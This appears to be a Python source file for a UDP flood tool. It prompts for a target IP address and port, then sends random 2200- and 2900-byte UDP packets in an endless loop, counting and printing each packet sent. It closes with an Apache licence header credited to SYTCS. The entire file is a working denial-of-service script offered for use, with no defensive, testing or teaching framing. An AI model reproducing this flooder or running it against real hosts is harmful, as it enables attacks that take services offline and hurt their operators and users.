import sys
import os
import socket
import random
import platform

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(2200)
bytes1 = random._urandom(2900)
system = platform.uname()[0]

def cls():
    if system == 'Windows':
        os.system("cls")
    elif system == 'Linux':
        os.system("clear")

cls()

try:
    os.system("python3 src/logo.py")
    ip = input("IP  : ")
    port = int(input("Port : "))  # Convert port to int
    os.system("python3 src/Starter.py")
except SyntaxError:
    print(R + '[-] ' + C + 'Error code: 422 Unprocessable Entity')

sent = 0
try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1

        print("Sending %s packet to %s through port:%s" % (sent, ip, port))

        sock.sendto(bytes1, (ip, port))
        sent += 1

        print("Sending %s packet to %s through port:%s" % (sent, ip, port))

except KeyboardInterrupt:
    print('\n' + R + '[!]' + C + ' Keyboard Interrupt! Terminating...' + W)

except socket.gaierror:
    print(R + '[-] ' + C + 'No address associated with this hostname! Unknown Address')
    print(R + '[-] ' + C + 'Please write a valid IP address!')

except NameError:
    print(R + '[-] ' + C + 'No address associated with hostname! Unknown Address')
    print(R + '[-] ' + C + 'Please write a valid IP address.')

    



    '''
 Copyright 2024 SYTCS

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
'''
